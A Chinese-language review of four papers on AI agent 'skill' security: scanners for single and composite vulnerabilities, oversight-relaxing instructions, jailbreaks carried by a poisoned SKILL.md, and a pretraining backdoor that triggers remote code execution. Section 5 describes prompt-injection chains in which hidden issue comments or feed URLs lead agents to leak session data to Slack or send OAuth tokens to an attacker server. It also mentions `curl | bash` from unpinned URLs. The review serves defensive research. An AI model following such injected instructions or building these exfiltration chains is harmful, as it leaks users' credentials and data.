### 4.5 根源解释：问题错配，而非能力不足

RQ4 的对照实验把根源钉死了：**限制扫描器的不是模型，而是提问**。现有扫描器（规则与提示词两端）都把 skill 当恶意软件问题处理，而放松指令里没有任何恶意软件——它是一条完全按作者意图工作的便利指令。安全语义的判定维度（恶意/良性）与风险的真实维度（监督极性）错位，于是一流的 LLM 在错误的问题上只能产出 F1 0.03–0.21 的答案；换一个问题，同一模型即刻匹配专用检测器。这也是对整个「LLM 安审工具」设计的普适警示：**提问的构念效度决定了工具的能力上限**。

值得对照的是第五篇将评的 37901——它的指令审查同样用 LLM，却问的是「动作是否跨越信任/授权边界」而非「是否恶意」，于是能抓到无恶意签名的非蓄意漏洞。两篇从不同方向收敛到同一设计原则：把风险操作化为可判定的具体问题（极性、边界、通路），比堆模型或堆规则更有效。

### 4.6 知识反推与通用灵感

论文给出的落地启示极为具体：对 skill 作者——**一行范围限定语（如「仅在 CI 中传 --yes」）就能保留大部分便利**；对 agent 厂商——安装时对无范围放松（尤其含 shell 执行的 skill）弹出警告；对目录维护者——修掉携带放松最多的 100 个家族就能覆盖近四分之一的受影响 skill，人工审 960 个高频放松单元即可覆盖一半出现次数——**上游修复的杠杆效应极大**；对扫描器开发者——极性感知规则（区分「never use --force」与「use --force」）或一条 oversight 专属 LLM 提问，都是廉价升级。方法论上的通用灵感：把「人类控制权增量」作为指令文本的可标注构念，配合 lexicon 召回 + codebook 人工金标 + 检测器放量的三段式管线，可以移植到 AGENTS.md、CLAUDE.md、MCP 描述等一切 agent 指令面。局限：测的是 skill 说了什么而非 agent 是否照做；lexicon 对放松短语的召回估计仅 32%（绝对数是下界）；单 LLM 判定 LLM 模式扫描的置信区间较宽。

## 五、Scan Before You Install：单点漏洞与复合漏洞的统一扫描

[📄 原文链接](https://arxiv.org/abs/2610.37901)

### 5.1 背景与定位

防御侧的最后一篇来自 Ben-Gurion University。它指出既有 skill 扫描器的两个盲区：其一，它们瞄准**恶意** skill，而公开仓库里大量风险来自**善意作者写出的非蓄意漏洞**（vulnerable vs malicious 的区分是论文明确给出的术语贡献）——例如 `curl | bash` 指向未锁定的 URL、或指示 agent「把抓取到的页面内容当作用户已批准的命令执行」；其二，它们**逐个孤立地**分析 skill，而 agent 常在单任务中串联多 skill、经共享文件/环境变量/对话上下文传递内容——两个孤立看都无害的 skill，组合起来可能打通一条「凭证收集 → 公开泄露」的通路。论文做出的**复合漏洞（composite vulnerability）**检测与缓解闭环，在公开方案中是第一个，且直接在真实 GitHub 语料上落地验证。

### 5.2 问题定义与威胁模型

威胁模型的四条基线假设很有价值：**A1** skill 的工具声明不构成独立权限边界（运行时权限设置才是）；**A2** skill 间可经共享文件、环境状态、agent 对话交互；**A3** 安装/启用单个 skill 的批准**不等于**批准 skill 间的一切数据传输——超出用户指令或显式批准范围的传输即未授权，即使底层工具调用全部合规（这一点在讨论中被升华为信息流安全原则：允许读 ≠ 允许把读到的发往任何地方）；**A4** 已安装的 skill 未必被联合评审过。攻击者模型：外部对手控制 agent 在合法任务中处理的内容（网页、issue 文本、仓库文件），不能改 skill 本体；可借这些内容诱导 skill 调用、影响 skill 间数据、或让文本被存储后在未来会话被当作指令读取。

### 5.3 解法：六模块扫描器与候选-验证分离

扫描器静态分析候选 skill s 与已装 skill 集 S，六模块流水线：

- **Content Extraction**：抽取每个 skill 的指令文档（SKILL.md）、捆绑文件、声明（作者声称的权限/能力/IO）与源位置引用，构成带证据溯源的四元组表示。
- **Local Analysis**（单 skill 漏洞）：四类确定性检查 + 可选 LLM 指令审查。模式检查（41 条规则：36 条指令上下文 + 5 条通用文本，含否定指令/攻击示例/占位凭证的上下文排除与 Unicode 规范化）；**值流检查**（value-flow）对 Python/JS/shell 做源到汇的污点追踪——源打完整性/机密性双标签（用户输入与网络输入默认低信任；密钥为受限机密），15 类 sink（shell 命令文本、反序列化为 critical 级）按策略评估，未知函数的返回值保守保留依赖；安装源检查（未加密传输高危、数字地址中危）；能力声明一致性检查（推断能力 vs 声明集合）。LLM 指令审查独立于模式检查运行——**任何检查都无权终判「安全」**，这点在下文被证明是超越其他扫描器的关键。
- **Composite Analysis**（复合漏洞）：从 R(U) 构建依赖多图 G0——artifact 边（u 写文件 ↔ v 读同键文件，路径规范化，裸文件名要求同命名空间）、state 边（同名环境变量）、trigger 边（具名调用），节点带推断能力标签（Egress/UntrustedInput/SensitiveData/Shell/Subagent）与权限声明；再加**接口层**（interface layer）确定性恢复两类不经共享资源的交接：Selector→Impact 的目标交接（一个 skill 的输出决定另一个 skill 对谁动手）与 Assessor→Deference 的决策交接（一个 skill 的 verdict 顶替了另一个 skill 行动前本应做的检查），四种角色由代码结构而非措辞定义；可选 LLM 增补提出 prose 中的依赖边。图上跑 **7 条复合规则**：数据外泄（SensitiveData→Egress 路径）、敏感消费、输入可达、目标交接、决策交接、权限失配、未声明能力，附严重度修饰符（路径含 UntrustedInput 的外泄升 critical；可信度全高的边才允许升级）。
- **Validation**（验证）：所有候选（局部的与复合的）交由无工具的验证 LLM 对照**逐字源证据**裁决。局部候选过三关：存在性（所报行为确实在引用位置作为 skill 的操作性部分存在——否定句、示例、模板、占位符一律不过）、可达性（用户不控制的低信任内容确实能决定 agent 遵循的指令/执行的代码/使用的参数）、后果性（超出用户授权）。复合候选过四关：producer / consumer / linkage（每一跳的输出确实能在文档化使用下被带到下一跳、且非用户逐值选定）/ consequence。证据对不上文件、或任一条件未获肯定回答的接受票被降级为拒绝并标记为 LLM 幻觉。
- **Reporting**：合并去重，输出结构化 JSON 与 SARIF，按「涉及候选 skill s」与「仅涉上下文」划分，保留确定性/模型辅助来源标注与处理状态。
- **Mitigation**（缓解，闭环的另一半）：分层推荐——**替换 skill**（在公共注册表/GitHub 搜替代品、锁定不可变 commit、对替代品重跑全套分析、配所需审批配置）、**补丁**（指令补丁或经用户同意的代码补丁，施于副本后重放验证）、**配置门控**（如把 shell 预授权改为按工具审批），每项建议都在沙箱中重放 PoC 攻击并检查合法任务是否仍可完成——只让 agent「请求确认」的补丁被明确降级为部分缓解，因为注入内容可能让 agent 无视该指令。

### 5.4 实验证据：五个 RQ 的完整答卷

先汇总五个 RQ 的核心数字：

| 评估 | 数据集 / 语料 | 核心结果 |
|---|---|---|
| RQ1 实测精度 | GitHub 75 高星仓库 1,587 skill | 59 项发现，53 项确认，**precision 89.8%**，41 个漏洞，23 个仓库 |
| RQ2 单 skill 基准 | SkillTrustBench 5,520 / 556 子集 | 全集 F1 95.99%；556 子集 **recall 95.90%**、FPR 4.22% |
| RQ2 恶意基准 | MalSkillBench 1,000 平衡采样 | precision 98.70%、**F1 94.69%**（五者最高） |
| RQ3 复合基准 | SCR-Bench 1,325 skill 集 | **precision 98.7% / recall 99.6% / F1 0.991** |
| RQ3 实测复合 | 同一 GitHub 语料 | **2 个真实复合漏洞**（PoC 验证，涉 4 skill/3 仓库） |
| RQ4 消融 | 556 子集 / 485 SCR 集 | 验证模块：FPR 33.5%→4.6%（局部）、7.0%→2.4%（复合） |
| RQ5 缓解 | 55 项发现 | **47 项三次重放全阻断且任务保持**，6 项部分缓解 |

逐条展开：

- **RQ1（GitHub 实测）**：从 19,198 个候选仓库取 star 最高的 75 个（20,129–358,086 star、共 2,197 个 skill，剔除同源翻译副本后 **1,587 个**）。Local Analysis 报 59 项发现（值流检查 17 项确认 14、模式检查 2/2、指令审查 40/37），三位独立分析师（各 3 年 AI 安全经验、盲评，57/59 全票）确认 **53 项，precision 89.8%**，覆盖 23 个仓库、去重后 **41 个独立漏洞**：注入内容控制代码/命令执行 21、跨会话持久化注入指令 5、绕过必需审批 8、数据/凭证外泄 3、敏感目录写入 4。按类别看确认最多的是提示注入（16/16 全确认）与代码执行（12/13）。**无一涉及恶意意图**——全部是「善意作者 + 可被外部内容左右的漏洞工作流」。严重度：高 1、中 11、低 41。参考集（8 仓库 52 skill 全人工审）上 recall 88.9%（漏掉的一个是安装期 registry 抓取内容变为常驻指令的持久化机制）。每个漏洞都开发了 PoC；10 个中高危已向维护者披露。成本：确定性检查 1,587 个 skill 合计 973 秒（中位 0.04 秒/skill、P95 0.5 秒）；指令审查中位 5.3 秒/skill，与验证合计约 9.54M 输入 + 0.71M 输出 token——**每个 skill 版本都跑一遍自动筛查在成本上完全可行**。
- **RQ2（基准对比）**：SkillTrustBench 全集 5,520 skill（2,863 恶意/1,014 可疑/1,643 正常）上 precision 96.95%、recall 95.05%、F1 95.99%、FPR 7.06%；556 案例 leaderboard 子集（390 恶意/166 良性）上与四家对手对比：本文 recall 95.90% 与 F1 最高、FPR 4.22% 次低（NVIDIA SkillSpector：recall 86.9% 但 FPR 12.7%；Cisco：recall 95.4% 但 FPR 24.7%；AgentSkillsScanner recall 56.4%；SkillSieve FPR 最低 0.60% 但 recall 仅 55.38%——**漏掉的安全问题换不来低误报的意义**）。MalSkillBench 平衡采样 1,000 例上 precision 98.70%、F1 94.69% 最高（AgentSkillsScanner recall 最高 90.4% 但 F1 81.2%）。诊断性发现：AgentSkillsScanner 与 SkillSieve 超 97% 的漏报被其保守静态预过滤提前判为安全，集中在无恶意签名的可疑/不安全编码/依赖类案例。
- **RQ3（复合漏洞）**：适配 SCR-Bench（SCR-CapFlow 150 对 + SCR-AuthBlur 117 对 + SCR-TrustLift 401 对 = 668 危险集；负例 = 547 对照 + 100 跨例打乱 + 10 干净对，共 1,325 集）：本文 **precision 98.7%（665 TP/9 FP）、recall 99.6%（3 FN）、F1 0.991**，对 SkillsGuard 三配置（review 0.858 / regex 0.854 / high 0.816，其中 review 模式 precision 仅 75.6%）与 LLM-only 基线（0.779，precision 64.5%——无依赖图直接读全部文档会大面积误报）全面领先。**真实语料上发现 2 个复合漏洞**（涉 3 仓库 4 skill，均 PoC 验证）：① **会话历史读取器 × Slack 发送器**——`claude-code-history-files-finder` 原样取回既往会话（含攻击者藏在 GitHub issue HTML 注释里的指令与一条金丝雀计费密钥），`slack` 把 agent 组写的文本发出去；两 skill 无共享文件、无环境变量、无相互调用，G0 本无边——模型增强补上 context 边后数据外泄规则命中。沙箱 12 次重放：GPT-5.2-Codex 2 次、GLM-5 **7 次**执行未授权 Slack 发送（GPT-5.2 其余 10 次识别为注入并上报用户——两 agent 的注入鲁棒性差距本身即是重要观测）。② **feed 监视器 × OAuth 诊断**——攻击者在受害者订阅的 feed 里发布载荷 URL，`watchers` 把它打印进 agent 上下文，载荷诱导 agent 把该 URL 当作 `mcp-oauth-remote-gateway` 的诊断目的地，后者把存储的 OAuth bearer token 发往攻击者服务器；GPT-5.2 5/12、GLM-5 6/12 金丝雀 token 到达监听器。**四个 skill 无一出现在 Local Analysis 的 59 项发现中**——复合风险独立于单点风险存在，孤立审查结构性看不见它。
- **RQ4（消融，五次运行均值±标准差）**：Local Analysis 上，仅确定性 D：recall 68.2%、FPR 27.7%；仅 LLM L：F1 0.956；D+L 无验证：recall 96.5% 但 **FPR 33.5%**；加验证后 D+L+V：precision 98.0%、recall 96.0%、**FPR 4.6%**——验证模块把误报压掉 86%。Composite 上（485 集），仅接口层 G0+IL：precision 100% 但 recall 54.7%（且对 SCR-AuthBlur 全军覆没）；模型增补边把 recall 抬到 99.2%（FPR 7.0%）；再加验证 G0+IL+ME+V：**precision 98.0%、recall 95.4%、FPR 2.4%**。结论清晰：确定性层给精度、LLM 层给召回、验证层把两者调和。
- **RQ5（缓解）**：55 项发现全部分配了缓解：替换 13 + 替换+配置 1、代码补丁 4、指令补丁 17、指令补丁+配置 20、其余 0；**47 项的三次 PoC 重放全部阻断且合法任务保持完成**，6 项部分缓解，2 项因沙箱网络限制（Artifactory 依赖装不上）未验证。Slack 案例的替代品遴选（8 候选逐一分析发送门控：3 个无门控、1 个可选草稿审、2 个仅靠确认指令——后者被降级为部分缓解，因为注入可让 agent 无视指令）最终选 Slack 官方的 `slackapi/slack-messaging` MCP 工具版 + 独立审批配置，把「shell 预授权」与「发消息审批」解耦——这是「用权限结构而非措辞做防御」的教科书示范。

### 5.5 根源解释：候选生成与证据验证的分离

论文自述优势不在任何单项技术，而在**架构**：宽口径候选生成与严口径证据验证彻底分离。四个对比扫描器缺这一层，于是两头失衡——保守静态预过滤（AgentSkillsScanner、SkillSieve）让漏报在到达模型前就被判安全，造成结构性低 recall；候选多而证据过滤弱（Cisco recall 95.4% 但 FPR 24.7%）则精度崩塌。本文的每个组件（模式、指令审查、值流、安装源、能力声明）都只产候选、无权判安全，最终由验证模块对照逐字源证据统一裁决——这同时解释了为何它在「无恶意签名的可疑/不安全编码案例」上拉开差距（那正是静态过滤器放走的部分），也解释了 89.8% 实测 precision 与消融中 4.6% FPR 的一致性。验证模块的三条件设计（存在性/可达性/后果性）本身即是一份对抗 LLM 幻觉的工程清单：否定句与示例文本过不了存在性、纯用户提供的数据过不了可达性、未越权的行为过不了后果性；接受票若无法在源文件中定位证据，直接降级为拒绝并标记幻觉。

复合漏洞存在的根源则在信息流：复合 PoC 里 agent 同时拥有「读会话历史」和「发 Slack 消息」两项权限，且每次调用都合规——但**权限的合集不等于数据传输的授权**，这正是威胁模型 A3 的现实演绎，也呼应了信息流安全的经典原则（Sabelfeld & Myers）：允许读某数据，本身并不约束接收程序随后把它发往何处。约束如何在 skill 生态里表达与执行，是论文留给生态设计的核心命题。

### 5.6 知识反推与通用灵感

可迁移的设计模式有三：**「任何单点检查不得终判安全 + 统一证据验证」**适用于一切检测器管线；**接口角色（Selector/Impact/Assessor/Deference）按代码结构而非措辞定义**，为跨组件授权流分析提供了可复用词汇；**缓解的沙箱重放验证（攻击三连测 + 合法任务保持）**把「建议」升级成「有证据的修复」。生态层的建议同样具体：各注册表各自扫描的现状（ClawHub 报扫描状态、Snyk 扫 Tessl、NVIDIA 出验证目录）覆盖不了跨源安装，需要一个中立方的公共 skill 市场按版本统一筛查，再辅以安装后 skill 集的复合分析与运行时管控。局限：纯静态（运行时生成的代码/资源名追踪不到——RQ1 漏掉的那个持久化漏洞即为例证）、值流仅覆盖三种语言、对抗性规避鲁棒性未评估、复合基准目前只有 SCR-Bench 一个。

## 六、四篇合评：Skill 生态攻击面全景与防御纵深

把四篇并置，Agent Skill 生态的安全问题呈现为一个清晰的四层堆栈，攻击与防御在每层都成对出现。

### 6.1 攻击面全景：预训练层 → 分发层 → 指令层 → 组合层

**预训练层（37741）**：攻击者无需任何特权访问，把 0.1% 的普通 prose 埋进网页级语料，后门即穿过 SFT/DPO/GRPO 全部干净后训练，以 92.7% 的 Pass@32 ASR 在部署的 CLI agent 上执行 RCE 载荷；投毒率压到二十万分之一仍不归零，且 ASR 随模型规模单调放大。这一层的可怕在于**距离**——攻击点（互联网上的文档）与伤害点（用户终端里的 shell）隔着整条训练管线，任何一环都不含恶意代码。**分发层（37738）**：单个被污染的 SKILL.md 把禁问成功率从 0.5% 抬到 45%、最高 68.9%，一份文件静默感染每个加载它的部署；混淆载荷无增益、模型选型带来 5 倍差异。**指令层（37734）**：不需要任何攻击者——153 万 skill 中约 88,000 个自带「别问、别停、别查」的便利指令，70.1% 无条件生效，且与 shell/sudo/装包能力显著共聚（OR 1.7–1.8）；它们经少数上游 skill 的复制链扩散（2.4% 的家族占一半拷贝）。**组合层（37901）**：四个各自无害、各自通过单点审查的真实 skill，两两组合出「会话历史→Slack 外泄」「OAuth token→攻击者端点」两条经 PoC 验证的攻击路径——每个工具调用都合规，授权却在组合中失守。

四层的共同结构是：**Agent 的授权边界由多层文本约定，而每一层文本都可被写、被抄、被藏、被组合。** 预训练层的毒是「陈述即信念」，分发层的毒是「配置即特权」，指令层的险是「便利即拆防」，组合层的险是「权限并集 ≠ 传输授权」。没有一层是传统意义上「包含恶意代码」的——这正是 Agent 供应链安全与传统软件供应链安全的本质分野。

### 6.2 防御侧的四个对应教训

**数据端过滤有结构性极限**（37741）：0.1% 预算要求近乎完美召回，declaration 文档无模板特征、ordinary-string 触发器无罕见串特征，签名/异常过滤双双失效——防线必须后移到部署期动作监控（沙箱、白名单、执行前分类器）。**配置通道要当不可信输入处理**（37738）：skill 文件应与用户轮同等受检（Unicode 规范化、越狱分类器、指令层级），供应链手段（签名、哈希锁定、更新 diff）补齐来源可信；基座模型选型本身即配置层防御。**检测器的构念效度决定上限**（37734）：同一个 GPT-5.4，被问「是否恶意」时 F1 0.21，被问「监督极性如何」时 0.65——升级扫描器最便宜的路径常常不是换模型而是换问题；上游修复的杠杆（960 个高频单元覆盖一半出现量）远大于逐个审计百万 skill。**候选-验证分离 + 组合分析**（37901）：无单点终判安全 + 统一源证据验证带来 95.9% recall 与 4.6% FPR 的兼得；复合漏洞必须在安装时对已装集合做依赖图分析，并在运行时管控 skill 间数据流。

### 6.3 纵深防御的拼图

四篇拼出的不是四个孤立结论，而是一条与四层攻击面严格对位的纵深防线：

| 层 | 攻击面 | 对应防线 | 出处 |
|---|---|---|---|
| 预训练 | 0.1% declaration 投毒→agent RCE 后门 | 数据 provenance 纳入安全模型；部署期动作监控 | 37741 |
| 分发 | 单个 SKILL.md 越狱→全部加载者沦陷 | 签名/哈希/更新 diff；加载时按不可信输入筛查；模型选型 | 37738 |
| 指令 | 88,000 skill 自带监督放松、上游集中扩散 | oversight 感知扫描；安装时对无范围放松告警；上游家族修复 | 37734 |
| 组合 | 权限合规但数据流越权（复合漏洞） | 安装时依赖图/组合规则分析；运行时传输授权管控 | 37901 |

值得强调的一个共识：**运行时动作监控是多层共用的最后防线**——预训练后门最终要执行一条命令，复合漏洞最终要发起一次越权传输，监督放松指令拆掉的正是那道人工确认。另一个共识同样重要：37734 与 37901 从两个方向证明「恶意/良性」二分已不足以支撑 skill 安审——大量真实风险来自善意作者的便利取舍与非蓄意弱点，安审工具的提问方式必须从「这是不是恶意的」转向「这改变了什么边界、组合出什么通路」。

### 6.4 未尽的缝隙

四篇也共同暴露了尚未被覆盖的接缝：

- **复合攻击的复合**：预训练后门与 skill 通道路径能否叠加（被投毒的模型 + 被污染的 skill，触发与载荷互相掩护）？没有任何一篇触及。
- **说的与做的不一致**：37734 测的是 skill 说了什么而非 agent 是否照做——监督指令的实际行为效应、以及一行范围限定语能否真正改变 agent 行为，尚缺大规模证据（作者也将其列为 future work）。
- **静态的边界**：37901 自承纯静态分析追不到运行时生成的代码与资源名——RQ1 漏掉的那个「安装期抓取内容变常驻指令」漏洞正是静态盲区的实例；沙箱执行与静态分析的配对是其自陈的下一步。
- **单架构的外推风险**：37738 只测了单一 LangChain QA agent、响应级自动判定未做人工校准；多步工具型 agent 上的复现尚属空白。
- **基准的碎片化**：SkillTrustBench/MalSkillBench 只有单 skill 标签，SCR-Bench 只覆盖组合案例，监督放松指令没有公开基准，配置注入鲁棒性也没有跨架构基准——防御侧的进展会继续被「各测各的」所碎片化，而这四类风险在真实部署中是同时在场。

## 七、结语

这四篇论文放在同一周出现并非巧合：Agent Skill 正在从「一个方便的 Markdown 约定」变成数百万份、跨仓库复制、被主流 agent 直接执行的准标准化基础设施——而它的安全研究才刚刚开始铺开。攻击侧的两篇告诉我们，威胁可以从互联网上一份普通文档出发、穿过整条训练管线在终端落地，也可以就藏在一份被无数次复制的配置文件里等待一句合适的提问；测量与防御侧的两篇告诉我们，风险的主要部分甚至不是恶意，而是便利的代价（拆掉的检查点）与组合的涌现（权限并集之外的通路），且现有工具在错误的提问下对这一切近乎失明。

对研究者，四条线都留了开阔的接缝：信念级后门的植入机制与干预（什么行为不能被还原为记忆字符串？midtraining 会怎样改写存续曲线？）、配置注入鲁棒性作为可测的模型属性、监督指令的行为效应测量与 scope 子句的实效验证、组合分析的动态化与对抗鲁棒性。对工程实践者，可立即落地的清单已经不短：skill 加载前做 Unicode 规范化与越狱筛查、对无范围放松指令加安装时警告、高星仓库跑一遍组合扫描、运行时把「读权限」与「发送授权」解耦、给 skill 文件上签名与哈希锁定、把 skill 更新的 diff 展示给用户。对生态设计者，中立方的统一 skill 市场与按版本的组合筛查，是比单点扫描器更结构性的答案。

一句话收束：**Agent 的能力由模型与 skill 共同堆出，Agent 的安全边界也必须同样堆到每一层文本上——从预训练语料的 provenance，到你今天顺手 install 的那份 SKILL.md。**
